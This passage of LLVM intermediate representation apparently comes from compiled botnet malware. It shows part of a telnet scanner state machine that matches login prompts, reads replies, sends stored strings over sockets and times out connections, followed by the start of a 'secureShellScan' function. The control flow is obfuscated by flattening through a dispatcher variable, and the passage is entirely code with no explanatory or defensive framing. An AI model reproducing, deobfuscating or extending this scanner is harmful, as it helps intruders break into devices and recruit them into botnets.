  %1820 = sext i32 %1819 to i64
  %.reload69 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1821 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload69, i64 %1820
  %1822 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1821, i32 0, i32 8
  %1823 = load i8*, i8** %1822, align 8
  %1824 = call i8* @strstr(i8* %1823, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i32 0, i32 0)) #10
  %1825 = icmp ne i8* %1824, null
  %1826 = select i1 %1825, i32 2057169142, i32 1116619129
  store i32 %1826, i32* %switchVar
  br label %loopEnd

; <label>:1827:                                   ; preds = %loopEntry
  %1828 = load i32, i32* %2, align 4
  %1829 = sext i32 %1828 to i64
  %.reload68 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1830 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload68, i64 %1829
  %1831 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1830, i32 0, i32 8
  %1832 = load i8*, i8** %1831, align 8
  call void @llvm.memset.p0i8.i64(i8* %1832, i8 0, i64 1024, i32 1, i1 false)
  %1833 = load i32, i32* %2, align 4
  %1834 = sext i32 %1833 to i64
  %.reload67 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1835 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload67, i64 %1834
  %1836 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1835, i32 0, i32 0
  %1837 = load i32, i32* %1836, align 16
  %1838 = call i32 @sclose(i32 %1837)
  %1839 = load i32, i32* %2, align 4
  %1840 = sext i32 %1839 to i64
  %.reload66 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1841 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload66, i64 %1840
  %1842 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1841, i32 0, i32 2
  store i8 0, i8* %1842, align 8
  %1843 = load i32, i32* %2, align 4
  %1844 = sext i32 %1843 to i64
  %.reload65 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1845 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload65, i64 %1844
  %1846 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1845, i32 0, i32 3
  store i8 0, i8* %1846, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1847:                                   ; preds = %loopEntry
  %1848 = load i32, i32* %2, align 4
  %1849 = sext i32 %1848 to i64
  %.reload64 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1850 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload64, i64 %1849
  %1851 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1850, i32 0, i32 8
  %1852 = load i8*, i8** %1851, align 8
  %1853 = call i32 @matchPrompt(i8* %1852)
  %1854 = icmp ne i32 %1853, 0
  %1855 = select i1 %1854, i32 -1253707483, i32 831970795
  store i32 %1855, i32* %switchVar
  br label %loopEnd

; <label>:1856:                                   ; preds = %loopEntry
  %1857 = load i32, i32* %2, align 4
  %1858 = sext i32 %1857 to i64
  %.reload63 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1859 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload63, i64 %1858
  %1860 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1859, i32 0, i32 8
  %1861 = load i8*, i8** %1860, align 8
  call void @llvm.memset.p0i8.i64(i8* %1861, i8 0, i64 1024, i32 1, i1 false)
  %1862 = load i32, i32* %2, align 4
  %1863 = sext i32 %1862 to i64
  %.reload62 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1864 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload62, i64 %1863
  %1865 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1864, i32 0, i32 0
  %1866 = load i32, i32* %1865, align 16
  %1867 = call i32 @sclose(i32 %1866)
  %1868 = load i32, i32* %2, align 4
  %1869 = sext i32 %1868 to i64
  %.reload61 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1870 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload61, i64 %1869
  %1871 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1870, i32 0, i32 2
  store i8 0, i8* %1871, align 8
  %1872 = load i32, i32* %2, align 4
  %1873 = sext i32 %1872 to i64
  %.reload60 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1874 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload60, i64 %1873
  %1875 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1874, i32 0, i32 3
  store i8 1, i8* %1875, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1876:                                   ; preds = %loopEntry
  %1877 = load i32, i32* %2, align 4
  %1878 = sext i32 %1877 to i64
  %.reload59 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1879 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload59, i64 %1878
  %1880 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1879, i32 0, i32 2
  store i8 7, i8* %1880, align 8
  store i32 40935118, i32* %switchVar
  br label %loopEnd

; <label>:1881:                                   ; preds = %loopEntry
  %1882 = load i32, i32* %2, align 4
  %1883 = sext i32 %1882 to i64
  %.reload58 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1884 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload58, i64 %1883
  %1885 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1884, i32 0, i32 8
  %1886 = load i8*, i8** %1885, align 8
  call void @llvm.memset.p0i8.i64(i8* %1886, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1887:                                   ; preds = %loopEntry
  %1888 = load i32, i32* %2, align 4
  %1889 = sext i32 %1888 to i64
  %.reload57 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1890 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload57, i64 %1889
  %1891 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1890, i32 0, i32 0
  %1892 = load i32, i32* %1891, align 16
  %1893 = load i32, i32* %2, align 4
  %1894 = sext i32 %1893 to i64
  %.reload56 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1895 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload56, i64 %1894
  %1896 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1895, i32 0, i32 8
  %1897 = load i8*, i8** %1896, align 8
  %1898 = load i32, i32* %2, align 4
  %1899 = sext i32 %1898 to i64
  %.reload55 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1900 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload55, i64 %1899
  %1901 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1900, i32 0, i32 7
  %1902 = load i16, i16* %1901, align 16
  %1903 = zext i16 %1902 to i32
  %1904 = call i32 @readUntil(i32 %1892, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0), i32 1, i32 0, i32 10000, i8* %1897, i32 1024, i32 %1903)
  %1905 = icmp ne i32 %1904, 0
  %1906 = select i1 %1905, i32 1218840619, i32 -1991178135
  store i32 %1906, i32* %switchVar
  br label %loopEnd

; <label>:1907:                                   ; preds = %loopEntry
  %1908 = load i32, i32* %2, align 4
  %1909 = sext i32 %1908 to i64
  %.reload54 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1910 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload54, i64 %1909
  %1911 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1910, i32 0, i32 6
  store i32 0, i32* %1911, align 4
  %1912 = load i32, i32* %2, align 4
  %1913 = sext i32 %1912 to i64
  %.reload53 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1914 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload53, i64 %1913
  %1915 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1914, i32 0, i32 7
  store i16 0, i16* %1915, align 16
  %1916 = load i32, i32* %2, align 4
  %1917 = sext i32 %1916 to i64
  %.reload52 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1918 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload52, i64 %1917
  %1919 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1918, i32 0, i32 8
  %1920 = load i8*, i8** %1919, align 8
  %1921 = call i8* @strstr(i8* %1920, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.39, i32 0, i32 0)) #10
  %1922 = icmp ne i8* %1921, null
  %1923 = select i1 %1922, i32 14293757, i32 1641373309
  store i32 %1923, i32* %switchVar
  br label %loopEnd

; <label>:1924:                                   ; preds = %loopEntry
  %1925 = load i32, i32* %2, align 4
  %1926 = sext i32 %1925 to i64
  %.reload51 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1927 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload51, i64 %1926
  %1928 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1927, i32 0, i32 8
  %1929 = load i8*, i8** %1928, align 8
  call void @llvm.memset.p0i8.i64(i8* %1929, i8 0, i64 1024, i32 1, i1 false)
  %1930 = load i32, i32* %2, align 4
  %1931 = sext i32 %1930 to i64
  %.reload50 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1932 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload50, i64 %1931
  %1933 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1932, i32 0, i32 0
  %1934 = load i32, i32* %1933, align 16
  %1935 = call i32 @sclose(i32 %1934)
  %1936 = load i32, i32* %2, align 4
  %1937 = sext i32 %1936 to i64
  %.reload49 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1938 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload49, i64 %1937
  %1939 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1938, i32 0, i32 2
  store i8 0, i8* %1939, align 8
  %1940 = load i32, i32* %2, align 4
  %1941 = sext i32 %1940 to i64
  %.reload48 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1942 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload48, i64 %1941
  %1943 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1942, i32 0, i32 3
  store i8 0, i8* %1943, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1944:                                   ; preds = %loopEntry
  %1945 = load i32, i32* %2, align 4
  %1946 = sext i32 %1945 to i64
  %.reload47 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1947 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload47, i64 %1946
  %1948 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1947, i32 0, i32 8
  %1949 = load i8*, i8** %1948, align 8
  %1950 = call i32 @matchPrompt(i8* %1949)
  %1951 = icmp ne i32 %1950, 0
  %1952 = select i1 %1951, i32 131866190, i32 1261119736
  store i32 %1952, i32* %switchVar
  br label %loopEnd

; <label>:1953:                                   ; preds = %loopEntry
  %1954 = load i32, i32* %2, align 4
  %1955 = sext i32 %1954 to i64
  %.reload46 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1956 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload46, i64 %1955
  %1957 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1956, i32 0, i32 8
  %1958 = load i8*, i8** %1957, align 8
  call void @llvm.memset.p0i8.i64(i8* %1958, i8 0, i64 1024, i32 1, i1 false)
  %1959 = load i32, i32* %2, align 4
  %1960 = sext i32 %1959 to i64
  %.reload45 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1961 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload45, i64 %1960
  %1962 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1961, i32 0, i32 0
  %1963 = load i32, i32* %1962, align 16
  %1964 = call i32 @sclose(i32 %1963)
  %1965 = load i32, i32* %2, align 4
  %1966 = sext i32 %1965 to i64
  %.reload44 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1967 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload44, i64 %1966
  %1968 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1967, i32 0, i32 2
  store i8 0, i8* %1968, align 8
  %1969 = load i32, i32* %2, align 4
  %1970 = sext i32 %1969 to i64
  %.reload43 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1971 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload43, i64 %1970
  %1972 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1971, i32 0, i32 3
  store i8 1, i8* %1972, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1973:                                   ; preds = %loopEntry
  %1974 = load i32, i32* %2, align 4
  %1975 = sext i32 %1974 to i64
  %.reload42 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1976 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload42, i64 %1975
  %1977 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1976, i32 0, i32 2
  store i8 7, i8* %1977, align 8
  store i32 1595431721, i32* %switchVar
  br label %loopEnd

; <label>:1978:                                   ; preds = %loopEntry
  %1979 = load i32, i32* %2, align 4
  %1980 = sext i32 %1979 to i64
  %.reload41 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1981 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload41, i64 %1980
  %1982 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1981, i32 0, i32 8
  %1983 = load i8*, i8** %1982, align 8
  call void @llvm.memset.p0i8.i64(i8* %1983, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:1984:                                   ; preds = %loopEntry
  %1985 = load i32, i32* %2, align 4
  %1986 = sext i32 %1985 to i64
  %.reload40 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1987 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload40, i64 %1986
  %1988 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1987, i32 0, i32 8
  %1989 = load i8*, i8** %1988, align 8
  %1990 = call i64 @strlen(i8* %1989) #10
  %1991 = trunc i64 %1990 to i16
  %1992 = load i32, i32* %2, align 4
  %1993 = sext i32 %1992 to i64
  %.reload39 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %1994 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload39, i64 %1993
  %1995 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %1994, i32 0, i32 7
  store i16 %1991, i16* %1995, align 16
  store i32 317534117, i32* %switchVar
  br label %loopEnd

; <label>:1996:                                   ; preds = %loopEntry
  store i32 -902642668, i32* %switchVar
  br label %loopEnd

; <label>:1997:                                   ; preds = %loopEntry
  store i32 -1387799748, i32* %switchVar
  br label %loopEnd

; <label>:1998:                                   ; preds = %loopEntry
  store i32 -409039389, i32* %switchVar
  br label %loopEnd

; <label>:1999:                                   ; preds = %loopEntry
  store i32 -63324342, i32* %switchVar
  br label %loopEnd

; <label>:2000:                                   ; preds = %loopEntry
  store i32 1596393296, i32* %switchVar
  br label %loopEnd

; <label>:2001:                                   ; preds = %loopEntry
  store i32 -1237080364, i32* %switchVar
  br label %loopEnd

; <label>:2002:                                   ; preds = %loopEntry
  store i32 -284176669, i32* %switchVar
  br label %loopEnd

; <label>:2003:                                   ; preds = %loopEntry
  %2004 = load i32, i32* %2, align 4
  %2005 = sext i32 %2004 to i64
  %.reload38 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2006 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload38, i64 %2005
  %2007 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2006, i32 0, i32 6
  %2008 = load i32, i32* %2007, align 4
  %2009 = add i32 %2008, 10
  %2010 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2011 = icmp ult i32 %2009, %2010
  %2012 = select i1 %2011, i32 -241125394, i32 -446270642
  store i32 %2012, i32* %switchVar
  br label %loopEnd

; <label>:2013:                                   ; preds = %loopEntry
  %2014 = load i32, i32* %2, align 4
  %2015 = sext i32 %2014 to i64
  %.reload37 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2016 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload37, i64 %2015
  %2017 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2016, i32 0, i32 0
  %2018 = load i32, i32* %2017, align 16
  %2019 = call i32 @sclose(i32 %2018)
  %2020 = load i32, i32* %2, align 4
  %2021 = sext i32 %2020 to i64
  %.reload36 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2022 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload36, i64 %2021
  %2023 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2022, i32 0, i32 2
  store i8 0, i8* %2023, align 8
  %2024 = load i32, i32* %2, align 4
  %2025 = sext i32 %2024 to i64
  %.reload35 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2026 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload35, i64 %2025
  %2027 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2026, i32 0, i32 3
  store i8 1, i8* %2027, align 1
  store i32 -446270642, i32* %switchVar
  br label %loopEnd

; <label>:2028:                                   ; preds = %loopEntry
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:2029:                                   ; preds = %loopEntry
  %2030 = load i32, i32* %2, align 4
  %2031 = sext i32 %2030 to i64
  %.reload34 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2032 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload34, i64 %2031
  %2033 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2032, i32 0, i32 0
  %2034 = load i32, i32* %2033, align 16
  %2035 = call i64 @send(i32 %2034, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.40, i32 0, i32 0), i64 4, i32 16384)
  %2036 = icmp slt i64 %2035, 0
  %2037 = select i1 %2036, i32 -635490566, i32 -2052439293
  store i32 %2037, i32* %switchVar
  br label %loopEnd

; <label>:2038:                                   ; preds = %loopEntry
  %2039 = load i32, i32* %2, align 4
  %2040 = sext i32 %2039 to i64
  %.reload33 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2041 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload33, i64 %2040
  %2042 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2041, i32 0, i32 0
  %2043 = load i32, i32* %2042, align 16
  %2044 = call i32 @sclose(i32 %2043)
  %2045 = load i32, i32* %2, align 4
  %2046 = sext i32 %2045 to i64
  %.reload32 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2047 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload32, i64 %2046
  %2048 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2047, i32 0, i32 2
  store i8 0, i8* %2048, align 8
  %2049 = load i32, i32* %2, align 4
  %2050 = sext i32 %2049 to i64
  %.reload31 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2051 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload31, i64 %2050
  %2052 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2051, i32 0, i32 3
  store i8 1, i8* %2052, align 1
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:2053:                                   ; preds = %loopEntry
  %2054 = load i32, i32* %2, align 4
  %2055 = sext i32 %2054 to i64
  %.reload30 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2056 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload30, i64 %2055
  %2057 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2056, i32 0, i32 2
  store i8 8, i8* %2057, align 8
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:2058:                                   ; preds = %loopEntry
  %2059 = load i32, i32* %2, align 4
  %2060 = sext i32 %2059 to i64
  %.reload29 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2061 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload29, i64 %2060
  %2062 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2061, i32 0, i32 6
  %2063 = load i32, i32* %2062, align 4
  %2064 = icmp eq i32 %2063, 0
  %2065 = select i1 %2064, i32 1905011757, i32 1488681542
  store i32 %2065, i32* %switchVar
  br label %loopEnd

; <label>:2066:                                   ; preds = %loopEntry
  %2067 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2068 = load i32, i32* %2, align 4
  %2069 = sext i32 %2068 to i64
  %.reload28 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2070 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload28, i64 %2069
  %2071 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2070, i32 0, i32 6
  store i32 %2067, i32* %2071, align 4
  store i32 1488681542, i32* %switchVar
  br label %loopEnd

; <label>:2072:                                   ; preds = %loopEntry
  %2073 = load i32, i32* %2, align 4
  %2074 = sext i32 %2073 to i64
  %.reload27 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2075 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload27, i64 %2074
  %2076 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2075, i32 0, i32 0
  %2077 = load i32, i32* %2076, align 16
  %2078 = call i64 @send(i32 %2077, i8* getelementptr inbounds ([193 x i8], [193 x i8]* @.str.41, i32 0, i32 0), i64 194, i32 16384)
  %2079 = icmp slt i64 %2078, 0
  %2080 = select i1 %2079, i32 -2080614403, i32 1421581411
  store i32 %2080, i32* %switchVar
  br label %loopEnd

; <label>:2081:                                   ; preds = %loopEntry
  %2082 = load i32, i32* %2, align 4
  %2083 = sext i32 %2082 to i64
  %.reload26 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2084 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload26, i64 %2083
  %2085 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2084, i32 0, i32 0
  %2086 = load i32, i32* %2085, align 16
  %2087 = call i32 @sclose(i32 %2086)
  %2088 = load i32, i32* %2, align 4
  %2089 = sext i32 %2088 to i64
  %.reload25 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2090 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload25, i64 %2089
  %2091 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2090, i32 0, i32 2
  store i8 0, i8* %2091, align 8
  %2092 = load i32, i32* %2, align 4
  %2093 = sext i32 %2092 to i64
  %.reload24 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2094 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload24, i64 %2093
  %2095 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2094, i32 0, i32 3
  store i8 1, i8* %2095, align 1
  %2096 = load i32, i32* %2, align 4
  %2097 = sext i32 %2096 to i64
  %.reload23 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2098 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload23, i64 %2097
  %2099 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2098, i32 0, i32 8
  %2100 = load i8*, i8** %2099, align 8
  call void @llvm.memset.p0i8.i64(i8* %2100, i8 0, i64 1024, i32 1, i1 false)
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:2101:                                   ; preds = %loopEntry
  %2102 = load i32, i32* %2, align 4
  %2103 = sext i32 %2102 to i64
  %.reload22 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2104 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload22, i64 %2103
  %2105 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2104, i32 0, i32 6
  %2106 = load i32, i32* %2105, align 4
  %2107 = add i32 %2106, 10
  %2108 = call i32 (i8*, ...) bitcast (i32 (...)* @time to i32 (i8*, ...)*)(i8* null)
  %2109 = icmp ult i32 %2107, %2108
  %2110 = select i1 %2109, i32 -992845916, i32 1286720982
  store i32 %2110, i32* %switchVar
  br label %loopEnd

; <label>:2111:                                   ; preds = %loopEntry
  %2112 = load i32, i32* %2, align 4
  %2113 = sext i32 %2112 to i64
  %.reload21 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2114 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload21, i64 %2113
  %2115 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2114, i32 0, i32 0
  %2116 = load i32, i32* %2115, align 16
  %2117 = call i32 @sclose(i32 %2116)
  %2118 = load i32, i32* %2, align 4
  %2119 = sext i32 %2118 to i64
  %.reload20 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2120 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload20, i64 %2119
  %2121 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2120, i32 0, i32 2
  store i8 0, i8* %2121, align 8
  %2122 = load i32, i32* %2, align 4
  %2123 = sext i32 %2122 to i64
  %.reload19 = load volatile %struct.telstate_t*, %struct.telstate_t** %.reg2mem18
  %2124 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %.reload19, i64 %2123
  %2125 = getelementptr inbounds %struct.telstate_t, %struct.telstate_t* %2124, i32 0, i32 3
  store i8 1, i8* %2125, align 1
  store i32 1286720982, i32* %switchVar
  br label %loopEnd

; <label>:2126:                                   ; preds = %loopEntry
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

NewDefault:                                       ; preds = %loopEntry
  store i32 2003215975, i32* %switchVar
  br label %loopEnd

; <label>:2127:                                   ; preds = %loopEntry
  store i32 -2109142397, i32* %switchVar
  br label %loopEnd

; <label>:2128:                                   ; preds = %loopEntry
  %2129 = load i32, i32* %2, align 4
  %2130 = add nsw i32 %2129, 1
  store i32 %2130, i32* %2, align 4
  store i32 1777063465, i32* %switchVar
  br label %loopEnd

; <label>:2131:                                   ; preds = %loopEntry
  store i32 1574327608, i32* %switchVar
  br label %loopEnd

; <label>:2132:                                   ; preds = %loopEntry
  ret void

loopEnd:                                          ; preds = %2131, %2128, %2127, %NewDefault, %2126, %2111, %2101, %2081, %2072, %2066, %2058, %2053, %2038, %2029, %2028, %2013, %2003, %2002, %2001, %2000, %1999, %1998, %1997, %1996, %1984, %1978, %1973, %1953, %1944, %1924, %1907, %1887, %1881, %1876, %1856, %1847, %1827, %1810, %1790, %1784, %1779, %1759, %1750, %1730, %1713, %1693, %1687, %1682, %1662, %1653, %1633, %1616, %1596, %1590, %1585, %1565, %1556, %1536, %1519, %1499, %1493, %1488, %1468, %1459, %1439, %1422, %1402, %1396, %1391, %1371, %1362, %1342, %1325, %1305, %1299, %1294, %1274, %1265, %1245, %1228, %1208, %1202, %1194, %1189, %1174, %1165, %1150, %1124, %1123, %1108, %1098, %1097, %1085, %1084, %1083, %1082, %1081, %1080, %1079, %1078, %1063, %1054, %1039, %1030, %1015, %1006, %991, %982, %967, %958, %943, %934, %919, %910, %895, %886, %880, %875, %870, %853, %833, %827, %822, %817, %800, %780, %774, %766, %761, %746, %737, %722, %696, %695, %680, %670, %669, %668, %667, %666, %654, %636, %616, %606, %601, %596, %579, %559, %541, %521, %511, %506, %501, %484, %464, %458, %453, %448, %431, %411, %405, %397, %396, %381, %371, %370, %355, %351, %350, %319, %304, %293, %261, %260, %251, %250, %244, %236, %235, %226, %215, %210, %187, %186, %161, %160, %155, %146, %135, %120, %100, %87, %LeafBlock, %NodeBlock, %NodeBlock1, %NodeBlock3, %NodeBlock5, %LeafBlock7, %NodeBlock9, %NodeBlock11, %NodeBlock13, %NodeBlock15, %70, %65, %64, %63, %60, %57, %42, %37, %23, %21, %20, %first, %switchDefault
  br label %loopEntry
}

; Function Attrs: nounwind
declare i8* @llvm.stacksave() #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) #4

declare i32 @time(...) #3

; Function Attrs: noinline nounwind uwtable
define void @secureShellScan() #0 {
  %.reg2mem342 = alloca i32
  %.reg2mem20 = alloca %struct.telstate_t*
  %.reg2mem = alloca i32
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca i32, align 4
  %4 = alloca %struct.__sigset_t, align 8
  %5 = alloca %struct.timeval, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
